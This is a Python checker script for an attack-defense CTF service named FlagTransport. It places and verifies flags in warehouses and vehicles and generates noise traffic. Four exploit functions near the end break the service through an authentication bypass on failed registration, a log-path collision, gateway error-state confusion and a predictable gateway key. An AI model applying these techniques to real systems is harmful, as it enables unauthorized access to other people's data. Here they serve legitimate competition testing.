#!/usr/bin/env python3

# TODO: Feedback - enochecker-test doesn't have enochecker-core set as a dependency

# TODO: Feedback - Logs are awful (probably just my incompentence to run one test at time)
# TODO: Feedback - enochecker_logs "ignore" first Ctrl+C

# TODO: Note for me - how the hell is checker network able to see/reach service network?!!

# TODO: Feedback - Random "Checker internal error" exceptions ("AttributeError: Variant_id 2 not defined for method putflag")

# TODO: Feedback - `from __future__ import annotations` breaks everything
# from __future__ import annotations

from dataclasses import dataclass
import math
import asyncio
import contextlib
import inspect
import random
import string
from logging import LoggerAdapter
from typing import Callable, NoReturn, ParamSpec, Self, TypeVar

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    BaseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher

T = TypeVar("T")
P = ParamSpec("P")


def fail(msg: str, err_log_msg: str | None = None) -> NoReturn:
    raise MumbleException(msg, err_log_msg)


UNKNOWN_RESPONSE = "Unexpected/Mumbled response"


def check(cond: bool, msg: str, err_log_msg: str | None = None):
    """`cond` must be `True` to pass."""
    if not cond:
        if not err_log_msg:
            frame = inspect.currentframe()
            assert frame is not None and frame.f_back is not None
            frame_info = inspect.getframeinfo(frame.f_back)
            assert frame_info.code_context is not None
            err_log_msg = f"Check failed at {frame_info.filename}@{frame_info.lineno}: {frame_info.code_context[0].strip()}"
        fail(msg, err_log_msg)


def check_eq(actual, expected, msg: str):
    check(actual == expected, msg, f"Expected {expected!r} but got {actual!r}")


@contextlib.contextmanager
def fail_context(context: str):
    try:
        yield
    except MumbleException as e:
        assert e.message
        e.message = f"{context}: {e.message}"
        raise


def set_fail_context(context: str) -> Callable[[Callable[P, T]], Callable[P, T]]:
    def wrapper(f: Callable[P, T]) -> Callable[P, T]:
        def wrapped(*args: P.args, **kwargs: P.kwargs) -> T:
            with fail_context(context):
                return f(*args, **kwargs)

        return wrapped

    return wrapper


def randbool(chance: float = 0.5) -> bool:
    return random.random() < chance


def randstr(
    length: int | tuple[int, int],
    extra: str = "",
    chars: str = string.ascii_letters + string.digits,
) -> str:
    if isinstance(length, tuple):
        length = random.randint(*length)
    return "".join(random.choices(chars + extra, k=length))


def random_text(l: int) -> str:
    end_chars = ".,:?!"
    o = ""
    while l:
        l -= 1
        if not l and randbool():
            o += random.choice(end_chars)
            continue
        if o and randbool(1 / 8):
            if l and randbool(1 / 5):
                o += random.choice(end_chars)
                l -= 1
            o += " "
        else:
            is_word_start = not o or o[-1] in (end_chars + " ")
            if (is_word_start and randbool(1 / 20)) or (o and o[-1] in string.digits):
                c = random.choice(string.digits)
            else:
                c = random.choice(string.ascii_lowercase)
                if is_word_start:
                    c = c.upper()
            o += c
    return o


@dataclass
class Point:
    x: int
    y: int

    def __str__(self) -> str:
        return str((self.x, self.y))

    def __repr__(self) -> str:
        return repr((self.x, self.y))

    def as_tuple(self) -> tuple[int, int]:
        return (self.x, self.y)

    def __add__(self, other: "Point") -> "Point":
        return Point(self.x + other.x, self.y + other.y)

    def __sub__(self, other: "Point") -> "Point":
        return Point(self.x - other.x, self.y - other.y)

    def sqr_mag(self) -> int:
        return self.x**2 + self.y**2

    def mag(self) -> float:
        return math.sqrt(self.sqr_mag())

    def manhattan(self) -> int:
        return abs(self.x) + abs(self.y)

    def random_near_point(
        self, max_distance: int = 50, min_distance: int = 1
    ) -> "Point":
        while True:
            offset = Point(
                random.randint(-max_distance, max_distance),
                random.randint(-max_distance, max_distance),
            )
            if min_distance <= offset.manhattan() <= max_distance:
                return self + offset

    def random_point_towards(
        self, target: "Point", max_distance: int | None = None
    ) -> "Point":
        if max_distance is None:
            max_distance = (self - target).manhattan()
        else:
            max_distance = min((self - target).manhattan(), max_distance)

        original_mag = (self - target).sqr_mag()
        while True:
            next = self.random_near_point(max_distance)
            if (next - target).sqr_mag() < original_mag:
                return next


def random_warehouse_name() -> str:
    return randstr((20, 40))


def random_password() -> str:
    return randstr((30, 40))


def random_vehichle_number() -> int:
    return random.randint(1, 99999999999999)


def random_cargo_id() -> str:
    return randstr((10, 30))


def random_location() -> Point:
    return Point(random.randint(0, 9999999), random.randint(0, 9999999))


def make_random_path(
    start: Point, end: Point, max_step: int = 30, step_limit: int | None = None
) -> list[Point]:
    o: list[Point] = [start]
    while o[-1] != end and (step_limit is None or step_limit):
        if (o[-1] - end).manhattan() <= max_step / 3:
            o.append(end)
        else:
            o.append(o[-1].random_point_towards(end, max_step))
        if step_limit:
            step_limit -= 1
    return o


# TODO: Feedback - I would like to put my "test methods" onto the checker class itself (like Faust)
# so I have state which I don't need to pass around through arguments (TODO: but I actually need to
# try to use it like that)
checker = Enochecker("FlagTransport", 6256)
# TODO: Feedback - Whole checker is bunch of boilerplate
app = lambda: checker.app


class BaseConnectionClient:
    def __init__(self, host: str, log: LoggerAdapter, port: int = 6256):
        self.host: str = host
        self.port: int = port
        self.log: LoggerAdapter = log

    async def _open_conn(self):
        self.log.debug("Openning new TCP connection to '%s:%s'", self.host, self.port)
        self._reader, self._writer = await asyncio.streams.open_connection(
            self.host, self.port
        )

    async def close(self):
        try:
            self._writer.close()
            # Why this is sepate method and not corutine returned from `.close()`?
            await self._writer.wait_closed()
        except:
            # We just ignore all exceptions about already closed / invalid stream
            pass

    async def reconnect(self):
        await self.close()
        await self._open_conn()

    @classmethod
    async def from_checker_task(
        cls, task: BaseCheckerTaskMessage, log: LoggerAdapter
    ) -> Self:
        client = cls(task.address, log)
        await client._open_conn()
        return client

    async def recv_raw(self, n: int) -> bytes:
        # TODO: Handle small buffer asyncio error
        self.log.debug("Receiving %s bytes...", n)
        data = await self._reader.readexactly(n)
        self.log.debug("Received %s bytes: %r", len(data), data)
        return data

    async def recv_until(self, delim: str | bytes, drop: bool = True) -> str:
        if isinstance(delim, str):
            delim = delim.encode()
        self.log.debug("Receiving until %r...", delim)
        data = await self._reader.readuntil(delim)
        self.log.debug("Received %s bytes: %r", len(data), data)
        # It may seem "more correct" to put this assert into the `if` block
        # but this invariant should hold all the time so it makes sense to
        # always verify this.
        assert data.endswith(delim)
        if drop:
            data = data.removesuffix(delim)
        try:
            return data.decode()
        except:
            self.log.error("Got non-ASCII response: %r", data)
            fail(UNKNOWN_RESPONSE)

    async def recv_line(self, expected: str | None = None) -> str:
        resp = await self.recv_until("\n")
        if expected is not None:
            check_eq(resp, expected, UNKNOWN_RESPONSE)
        return resp

    async def send_line(self, data: str | bytes):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        self.log.debug("Sending %s bytes: %r", len(data), data)
        self._writer.write(data)
        # Why? Just why? I hate async(io)...
        await self._writer.drain()


class ControllerClient(BaseConnectionClient):
    async def _open_conn(self):
        await super()._open_conn()
        await self.recv_line("$>> FlagTransport")
        await self.recv_line("$>>       Controller")
        await self.recv_line("$>>             Console")

    @set_fail_context("REGISTER WAREHOUSE")
    async def register_warehouse(
        self, name: str, password: str, location: Point
    ) -> bool:
        self.log.info(
            "Registering warehouse %r with password %r at %r...",
            name,
            password,
            location,
        )
        assert len(name) > 5
        await self.send_line("REGISTER WAREHOUSE")
        await self.recv_line("?>> Warehouse name:")
        await self.send_line(name)
        await self.recv_line("?>> Warehouse password:")
        await self.send_line(password)
        await self.recv_line("?>> Location:")
        await self.send_line(f"{location.x} {location.y}")

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning("Registration failed (warehouse name %r)", name)
            return False

        self.log.error("Got unexpected response: %r", resp)
        fail(UNKNOWN_RESPONSE)

    @set_fail_context("MANAGE WAREHOUSE")
    async def manage_warehouse(self, name: str, password: str) -> bool:
        self.log.info("Try to manage warehouse %r using password %r...", name, password)
        assert len(name) > 5
        await self.send_line("MANAGE WAREHOUSE")
        await self.recv_line("?>> Warehouse name:")
        await self.send_line(name)
        await self.recv_line("?>> Warehouse password:")
        await self.send_line(password)

        resp = await self.recv_line()
        if resp == "/>> Authentication success":
            self.log.info("Authentication success")
            return True
        if resp == "!>> Authentication failed":
            self.log.warning("Authentication failed")
            return False

        self.log.error("Got unexpected response: %r", resp)
        fail(UNKNOWN_RESPONSE)

    @set_fail_context("REGISTER CARGO")
    async def register_cargo(self, id: str, destination: str, note: str) -> bool:
        self.log.info(
            "Registering cargo %r with destination %r and note %r...",
            id,
            destination,
            note,
        )
        await self.send_line("REGISTER CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(id)
        await self.recv_line("?>> Cargo destination:")
        await self.send_line(destination)
        await self.recv_line("?>> Cargo note:")
        await self.send_line(note)

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning("Registration failed (cargo ID %r)", id)
            return False

        # TODO: Probably replace all of these with some method of something
        self.log.error("Got unexpected response: %r", resp)
        fail(UNKNOWN_RESPONSE)

    @set_fail_context("LIST CARGO")
    async def list_cargo(self) -> list[tuple[str, str]]:
        """Returns `list[tuple[CARGO_ID, NOTE]]`"""
        self.log.info("Listing cargo in current warehouse...")
        await self.send_line("LIST CARGO")
        await self.recv_line("/>> Cargo list start")
        output: list[tuple[str, str]] = []
        while True:
            resp = await self.recv_line()
            if resp == "/>> Cargo list end":
                break
            if not resp.startswith("*>> Cargo ") or ": " not in resp:
                self.log.error("Got unexpected response: %r", resp)
                fail(UNKNOWN_RESPONSE)
            resp = resp.removeprefix("*>> Cargo ")
            # "type: ignore" because type checker is not sure whenever
            # tuple will actually have exactly two elements be we are
            # sure it will because we split at most one time and we
            # check for existence of delimiter.
            output.append(tuple(resp.split(": ", 1)))  # type: ignore

        self.log.info("Retrieved %s cargo items", len(output))
        return output

    @set_fail_context("READ LOG")
    async def read_log(self) -> list[str]:
        self.log.info("Reading log for current warehouse...")
        await self.send_line("READ LOG")
        await self.recv_line("/>> Log start")
        output: list[str] = []
        while True:
            resp = await self.recv_line()
            if resp == "/>> Log end":
                break
            output.append(resp)
        self.log.info("Retrieved %s log entries", len(output))
        return output

    @set_fail_context("REGISTER VEHICHLE")
    async def register_vehichle(
        self, number: int, password: str, location: Point
    ) -> bool:
        self.log.info(
            "Registering vehichle %r with password %r at %r...",
            number,
            password,
            location,
        )
        await self.send_line("REGISTER VEHICHLE")
        await self.recv_line("?>> Vehichle number:")
        await self.send_line(str(number))
        await self.recv_line("?>> Vehichle password:")
        await self.send_line(password)
        await self.recv_line("?>> Location:")
        await self.send_line(f"{location.x} {location.y}")

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning("Registration failed (vehichle number %r)", number)
            return False

        self.log.error("Got unexpected response: %r", resp)
        fail(UNKNOWN_RESPONSE)

    @set_fail_context("MANAGE VEHICHLE")
    async def manage_vehichle(self, number: int, password: str) -> bool:
        self.log.info(
            "Try to manage vehichle %r using password %r...", number, password
        )
        await self.send_line("MANAGE VEHICHLE")
        await self.recv_line("?>> Vehichle number:")
        await self.send_line(str(number))
        await self.recv_line("?>> Vehichle password:")
        await self.send_line(password)

        resp = await self.recv_line()
        if resp == "/>> Authentication success":
            self.log.info("Authentication success")
            return True
        if resp == "!>> Authentication failed":
            self.log.warning("Authentication failed")
            return False

        self.log.error("Got unexpected response: %r", resp)
        fail(UNKNOWN_RESPONSE)

    @set_fail_context("GATEWAY KEY")
    async def get_gateway_key(self) -> str:
        self.log.info("Gettting gateway key for current vehichle...")
        await self.send_line("GATEWAY KEY")
        resp = await self.recv_line()
        if not resp.startswith("/>> Key: "):
            self.log.error("Got unexpected response: %r", resp)
            fail(UNKNOWN_RESPONSE)
        key = resp.removeprefix("/>> Key: ")
        self.log.info("Obtained key %r", key)
        # TODO: Check key format?
        return key

    @set_fail_context("LOAD CARGO")
    async def load_cargo(self, id: str):
        self.log.info("Loading cargo %r...", id)
        await self.send_line("LOAD CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(id)
        await self.recv_line("/>> Cargo loaded to the vehichle")
        self.log.info("Cargo loaded")

    @set_fail_context("UNLOAD CARGO")
    async def unload_cargo(self, id: str):
        self.log.info("Unloading cargo %r...", id)
        await self.send_line("UNLOAD CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(id)
        await self.recv_line("/>> Cargo unloaded from vehichle")
        self.log.info("Cargo unloaded")

    @set_fail_context("EXIT")
    async def exit(self):
        self.log.info("Exiting...")
        await self.send_line("EXIT")
        await self.recv_line("/>> Console closed")
        await self.close()

    async def register_random_warehouse(
        self,
        *,
        location: Point | None = None,
        in_proximity_of: Point | None = None,
        retries: int = 3,
    ) -> tuple[str, str, Point]:
        """Returns `(NAME, PASSWORD, (X, Y))`"""
        for _ in range(retries):
            name = random_warehouse_name()
            password = random_password()
            location = (
                (
                    random_location()
                    if in_proximity_of is None
                    else in_proximity_of.random_near_point()
                )
                if location is None
                else location
            )
            if await self.register_warehouse(name, password, location):
                return name, password, location
        fail("Failed to register a warehouse")

    async def register_random_vehichle(
        self,
        *,
        location: Point | None = None,
        in_proximity_of: Point | None = None,
        retries: int = 3,
    ) -> tuple[int, str, Point]:
        """Returns `(NUMBER, PASSWORD, (X, Y))`"""
        for _ in range(retries):
            number = random_vehichle_number()
            password = random_password()
            location = (
                (
                    random_location()
                    if in_proximity_of is None
                    else in_proximity_of.random_near_point()
                )
                if location is None
                else location
            )
            if await self.register_vehichle(number, password, location):
                return number, password, location
        fail("Failed to register a vehichle")

    async def register_random_cargo(
        self,
        *,
        destination: str | None = None,
        note: str | None = None,
        retries: int = 3,
    ) -> tuple[str, str, str]:
        """Returns `(ID, DESTINATION, NOTE)`"""
        for _ in range(retries):
            id = random_cargo_id()
            if not destination:
                destination = random_warehouse_name()
            if not note:
                note_len = random.randint(10, 50)
                note = (
                    random_text(note_len).strip() if randbool() else randstr(note_len)
                )
            if await self.register_cargo(id, destination, note):
                return id, destination, note
        fail("Failed to register a cargo")


class GatewayClient(BaseConnectionClient):
    class StreamReaderProtocolUDP(asyncio.streams.StreamReaderProtocol):
        # This is copy-pasted `asyncio.streams.StreamReaderProtocol.data_received()`
        def datagram_received(self, data, addr):
            reader = self._stream_reader  # type: ignore
            if reader is not None:
                reader.feed_data(data)

    async def _open_conn(self):
        self.log.debug("Openning new UDP connection to '%s:%s'", self.host, self.port)
        # This is basically copy-paste from `asyncio.streams.open_connection()`
        loop = asyncio.get_running_loop()
        self._reader = asyncio.streams.StreamReader(limit=2**16, loop=loop)
        self._protocol = GatewayClient.StreamReaderProtocolUDP(self._reader, loop=loop)
        self._transport, _ = await loop.create_datagram_endpoint(
            lambda: self._protocol, remote_addr=(self.host, self.port)
        )
        self.needs_new_connection: bool = False

    async def close(self):
        self._transport.close()

    async def send_line(self, data: str | bytes):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        self.log.debug("Sending %s bytes: %r", len(data), data)
        self._transport.sendto(data)
        await self._protocol._drain_helper()  # type: ignore

    @set_fail_context("Gateway location update")
    async def location_update(
        self,
        vehichle_number: int,
        gateway_key: str,
        location: Point,
        *,
        keep_connection_after: bool = False,
    ):
        self.log.info(
            "Updating location for vehichle %s to %r...", vehichle_number, location
        )
        if self.needs_new_connection:
            await self.reconnect()

        request = f"{vehichle_number}:{gateway_key}:L:{location.x}:{location.y}"
        await self.send_line(request)
        await self.recv_line(":OK:")
        await self.recv_line(":END:")

        self.log.info("Location updated")

        if not keep_connection_after:
            await self.close()
            self.needs_new_connection = True

    @set_fail_context("Gateway status check")
    async def get_status(
        self,
        vehichle_number: int,
        gateway_key: str,
        *,
        keep_connection_after: bool = False,
    ) -> tuple[Point, list[tuple[str, str, str]]]:
        self.log.info("Getting status of vehichle %s...", vehichle_number)
        if self.needs_new_connection:
            await self.reconnect()

        request = f"{vehichle_number}:{gateway_key}:S"
        await self.send_line(request)

        resp = await self.recv_line()
        if not resp.startswith(":LOC:") or not resp.endswith(":"):
            fail(UNKNOWN_RESPONSE)

        resp = resp.removeprefix(":LOC:").removesuffix(":")
        try:
            location = Point(*map(int, resp.split(":")))
        except:
            fail(UNKNOWN_RESPONSE)

        self.log.info("Vehichle is at %s", location)

        cargo_list: list[tuple[str, str, str]] = []
        while True:
            resp = await self.recv_line()
            if resp == ":OK:":
                break
            if not resp.startswith(":CAR:") or not resp.endswith(":"):
                fail(UNKNOWN_RESPONSE)
            resp = resp.removeprefix(":CAR:").removesuffix(":")
            splited = tuple(resp.split(":"))
            if len(splited) != 3:
                fail(UNKNOWN_RESPONSE)
            cargo_list.append(splited)

        self.log.info("Vehichle has %s cargo items", len(cargo_list))

        await self.recv_line(":END:")

        if not keep_connection_after:
            await self.close()
            self.needs_new_connection = True

        return (location, cargo_list)


# TODO: Feedback - Would be nice to support `Self` as a return annotation...


@checker.register_dependency
async def create_controller_client(
    task: BaseCheckerTaskMessage, log: LoggerAdapter
) -> ControllerClient:
    return await ControllerClient.from_checker_task(task, log)


del create_controller_client


@checker.register_dependency
async def create_gateway_client(
    task: BaseCheckerTaskMessage, log: LoggerAdapter
) -> GatewayClient:
    return await GatewayClient.from_checker_task(task, log)


del create_gateway_client

### FLAGSTORE 0 - Flag cargo in warehouse ###


# TODO: Feedback - `ChainDB.get()` is not annotated for allowed "storable" types
# TODO: Feedback - decorators not annotated for return value altough it is expected for fucntions to return a str
@checker.putflag(0)
async def putflag_warehouse(
    task: PutflagCheckerTaskMessage, state: ChainDB, log: LoggerAdapter
) -> str:
    gateway = await GatewayClient.from_checker_task(task, log)
    controller0 = await ControllerClient.from_checker_task(task, log)
    _, _, warehouse0_location = await controller0.register_random_warehouse()
    controller1 = await ControllerClient.from_checker_task(task, log)

    warehouse1_name, warehouse1_password, warehouse1_location = (
        await controller1.register_random_warehouse(in_proximity_of=warehouse0_location)
    )
    vehichle_number, vehichle_password, _ = await controller0.register_random_vehichle(
        location=warehouse0_location
    )
    cargo_id, _, _ = await controller0.register_random_cargo(
        destination=warehouse1_name, note=task.flag
    )
    await controller0.load_cargo(cargo_id)

    await controller1.manage_vehichle(vehichle_number, vehichle_password)
    gateway_key = await controller1.get_gateway_key()
    for location in make_random_path(warehouse0_location, warehouse1_location)[1:]:
        await gateway.location_update(vehichle_number, gateway_key, location)

    await controller1.unload_cargo(cargo_id)

    await state.set("warehouse_login", (warehouse1_name, warehouse1_password))
    return f"Flag cargo arrived to warehouse {warehouse1_name!r}"


# TODO: Feedback - It would be nice to be able to do multiple `@getflag()` for one flagstore
@checker.getflag(0)
async def getflag_warehouse(
    task: GetflagCheckerTaskMessage, state: ChainDB, log: LoggerAdapter
):
    try:
        warehouse_login = await state.get("warehouse_login")
    except KeyError:
        raise MumbleException("Flag was not placed in previous tick")

    async def check_cargo_list():
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_warehouse(*warehouse_login)
        for _, note in await controller.list_cargo():
            if task.flag in note:
                return
        raise MumbleException("Flag was not found in cargo list")

    async def check_log():
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_warehouse(*warehouse_login)
        for log_entry in await controller.read_log():
            if task.flag in log_entry:
                return
        raise MumbleException("Flag was not found in warehouse log")

    checks = [check_cargo_list, check_log]
    random.shuffle(checks)
    for check in checks:
        await check()


# TODO: Feedback - why *I* need to manually increment these numbers when they don't really mean anything?
@checker.exploit(0)
async def exploit_failed_registration(
    task: ExploitCheckerTaskMessage,
    controller: ControllerClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    target_warehouse_name = task.attack_info.removeprefix(
        "Flag cargo arrived to warehouse '"
    ).removesuffix("'")
    if target_warehouse_name == task.attack_info:
        raise MumbleException("Wrong attack info")

    # We try to register as (already existing) target warehouse name...
    await controller.register_warehouse(
        target_warehouse_name, random_password(), Point(0, 0)
    )
    # ... this fails but we are now authenticated to it due to a logic error.

    for x in await controller.list_cargo():
        if flag := flag_seacher.search_flag(x[1]):
            return flag

    raise MumbleException(
        f"'Failed registration' exploit failed for {target_warehouse_name!r}"
    )


@checker.exploit(1)
async def exploit_log_path_length(
    task: ExploitCheckerTaskMessage,
    controller: ControllerClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    target_warehouse_name = task.attack_info.removeprefix(
        "Flag cargo arrived to warehouse '"
    ).removesuffix("'")
    if target_warehouse_name == task.attack_info:
        raise MumbleException("Wrong attack info")

    # We register warehouse that has last 5 chars different...
    await controller.register_warehouse(
        target_warehouse_name[:-5] + randstr(5), random_password(), Point(0, 0)
    )
    # ... this makes us able to see logs of target warehouse.

    for x in await controller.read_log():
        if flag := flag_seacher.search_flag(x):
            return flag

    raise MumbleException(
        f"'Log path length' exploit failed for {target_warehouse_name!r}"
    )


### FLAGSTORE 1 - Flag cargo in vehichle ###


@checker.putflag(1)
async def putflag_vehichle(
    task: PutflagCheckerTaskMessage, state: ChainDB, log: LoggerAdapter
) -> str:
    # Register warehouse and dispatch vehichle
    controller = await ControllerClient.from_checker_task(task, log)
    if randbool():
        vehichle_number, vehichle_password, vehichle_location = (
            await controller.register_random_vehichle()
        )
        _, _, warehouse_location = await controller.register_random_warehouse(
            in_proximity_of=vehichle_location
        )
    else:
        _, _, warehouse_location = await controller.register_random_warehouse()
        vehichle_number, vehichle_password, _ = (
            await controller.register_random_vehichle(
                in_proximity_of=warehouse_location
            )
        )

    # Move vehichle to warehouse location
    gateway = await GatewayClient.from_checker_task(task, log)
    gateway_key = await controller.get_gateway_key()
    await gateway.location_update(vehichle_number, gateway_key, warehouse_location)

    # Load flag cargo
    cargo_id, _, _ = await controller.register_random_cargo(
        destination=random_warehouse_name(), note=task.flag
    )
    await controller.load_cargo(cargo_id)

    # Move vehichle a bit
    vehichle_location = warehouse_location.random_near_point()
    await gateway.location_update(vehichle_number, gateway_key, vehichle_location)

    # Save state
    await state.set("vehichle_login", (vehichle_number, vehichle_password))
    await state.set("gateway_key", gateway_key)
    await state.set("cargo_id", cargo_id)
    await state.set("vehichle_location", vehichle_location.as_tuple())
    return f"Flag cargo is being transported by vehichle #{vehichle_number!r}"


@checker.getflag(1)
async def getflag_vehichle(
    task: GetflagCheckerTaskMessage, state: ChainDB, log: LoggerAdapter
):
    try:
        vehichle_login = await state.get("vehichle_login")
        gateway_key = await state.get("gateway_key")
        cargo_id = await state.get("cargo_id")
        vehichle_location = Point(*(await state.get("vehichle_location")))
    except KeyError:
        raise MumbleException("Flag was not placed in previous tick")

    if randbool():
        # Sometimes we use different gateway key...
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_vehichle(*vehichle_login)
        gateway_key = await controller.get_gateway_key()
        if randbool():
            await controller.close()
        # ... and sometimes we keep using it in future...
        if randbool():
            await state.set("gateway_key", gateway_key)

    gateway = await GatewayClient.from_checker_task(task, log)
    current_location, cargo_list = await gateway.get_status(
        vehichle_login[0], gateway_key
    )

    check_eq(current_location, vehichle_location, "Vehichle location changed")
    check_eq(len(cargo_list), 1, "Amount of loaded cargo changed")
    check_eq(cargo_list[0][0], cargo_id, "ID of loaded cargo changed")
    check_eq(cargo_list[0][2], task.flag, "Note of loaded cargo changed")


@checker.exploit(2)
async def exploit_gateway_error_handling(
    task: ExploitCheckerTaskMessage,
    log: LoggerAdapter,
    gateway: GatewayClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    try:
        target_vehichle = int(
            task.attack_info.removeprefix(
                "Flag cargo is being transported by vehichle #"
            )
        )
    except ValueError:
        raise MumbleException("Wrong attack info") from None

    controller = await ControllerClient.from_checker_task(task, log)

    for _ in range(3):
        our_number, _, _ = await controller.register_random_vehichle()
        key = await controller.get_gateway_key()

        # We need to try such vehichle number to which we can add our
        # vehichle number and get target vehichle number.
        # `VEHICHLE_NUMBER_MOD` is there just in case we underflow/overflow
        # but if this mod is wrong (e.g. team changed the max number size),
        # then we can try again and get vehichle number which won't cause
        # and these issues.
        VEHICHLE_NUMBER_MOD = 1000000000000000
        exploitable_number = (our_number - target_vehichle) % VEHICHLE_NUMBER_MOD

        if await controller.register_vehichle(exploitable_number, random_password(), random_location()):
            break
    else:
        fail("Failed to register a vehichle")

    # We need to do a operation with "exploitable" vehichle that causes an error.
    # Connection is kept open upon an error but internal state is not reset and
    # we take advantage of it.
    await gateway.send_line(f"{exploitable_number}:{key}:S")
    await gateway.recv_until(":ERR:\n")
    await gateway.send_line(f"{target_vehichle}:{key}:S")

    if flag := flag_seacher.search_flag(await gateway.recv_until(":END:\n")):
        return flag

    raise MumbleException(
        f"'Gateway error handling' exploit failed for {target_vehichle!r}"
    )


@checker.exploit(3)
async def exploit_predicatable_gateway_key(
    task: ExploitCheckerTaskMessage,
    gateway: GatewayClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    try:
        target_vehichle = int(
            task.attack_info.removeprefix(
                "Flag cargo is being transported by vehichle #"
            )
        )
    except ValueError:
        raise MumbleException("Wrong attack info") from None

    # Code for gateway key generation:
    #   PERFORM VARYING Gateway-Key-Index FROM 1 BY 1
    #       UNTIL Gateway-Key-Index > FUNCTION LENGTH(VE-Password)
    #       COMPUTE Gateway-Key-Temp =
    #           26 * FUNCTION ORD(VE-Password(Gateway-Key-Index:1))
    #           + Gateway-Key-Index * VE-Number + Gateway-Key-Index
    #       MOVE FUNCTION CHAR(
    #           66 + FUNCTION MOD(Gateway-Key-Temp, 26)
    #       ) TO Gateway-Key(Gateway-Key-Index:1)

    # Password can be basically ommited (due to modulation)
    # and so we can compute the key for ourself:
    key = ""
    for i in range(1, 50+1):
        # "chr(n)" in COBOL means "n-th" char in ASCII so we need to do - 1.
        key += chr(66 + ((i * target_vehichle + i) % 26) - 1)

    for x in (await gateway.get_status(target_vehichle, key))[1]:
        if flag := flag_seacher.search_flag(x[2]):
            return flag

    raise MumbleException(
        f"'Predicatable gateway key' exploit failed for {target_vehichle!r}"
    )


### SLA checks ###


@checker.putnoise(0)
async def putnoise_warehouse_cargo(state: ChainDB, controller: ControllerClient):
    name, password, _ = await controller.register_random_warehouse()
    cargo = await controller.register_random_cargo()
    await state.set("warehouse_login", (name, password))
    await state.set("cargo", cargo)


@checker.getnoise(0)
async def getnoise_unregistered(state: ChainDB, controller: ControllerClient):
    try:
        warehouse_login = await state.get("warehouse_login")
        expected_cargo = await state.get("cargo")
    except KeyError:
        raise MumbleException("Noise was not placed in previouse tick")

    await controller.manage_warehouse(*warehouse_login)
    cargo_list = await controller.list_cargo()

    if not cargo_list:
        raise MumbleException("Cargo gone missing from warehouse")
    check_eq(len(cargo_list), 1, "Warehouse got extra cargo items")
    check_eq(cargo_list[0][0], expected_cargo[0], "Cargo ID changed")
    check_eq(cargo_list[0][1], expected_cargo[2], "Cargo note changed")


@checker.havoc(0)
async def havoc_random_vehichle(client: ControllerClient, gateway: GatewayClient):
    number, _, location = await client.register_random_vehichle()
    gateway_key = await client.get_gateway_key()
    for location in make_random_path(location, location.random_near_point(200, 50))[1:]:
        await gateway.location_update(
            number, gateway_key, location.random_near_point(3, 0)
        )
    if randbool():
        await gateway.get_status(number, gateway_key)


@checker.havoc(1)
async def havoc_random_warehouse(client: ControllerClient):
    await client.register_random_warehouse()
    for _ in range(random.randint(1, 3)):
        await client.register_random_cargo()
        if randbool(0.3):
            if randbool():
                await client.read_log()
            else:
                await client.list_cargo()


# TODO: Feedback - Logging of exception messages is inconsistent...
# Sometimes it logs as an INFO level, sometimes as an ERROR level.
# IMHO most of them should be an ERROR level.
# (Especially e.g. `MumbledException.log_message`)

if __name__ == "__main__":
    checker.run(port=1337)
